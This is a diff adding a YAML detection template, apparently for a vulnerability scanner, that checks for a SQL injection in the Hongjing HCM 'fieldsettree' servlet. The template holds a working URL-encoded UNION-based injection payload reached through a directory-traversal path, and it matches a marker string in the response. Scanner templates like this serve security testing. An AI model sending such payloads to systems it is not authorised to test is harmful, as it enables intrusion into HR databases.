@@ -1,0 +1,11 @@
+name: 宏景HCM-fieldsettree-SQL注入
+description: >-
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2C18--%20ltAi
+    expression:
+      status: 200
+      body_all: ["qjjpq1qkvjq"]
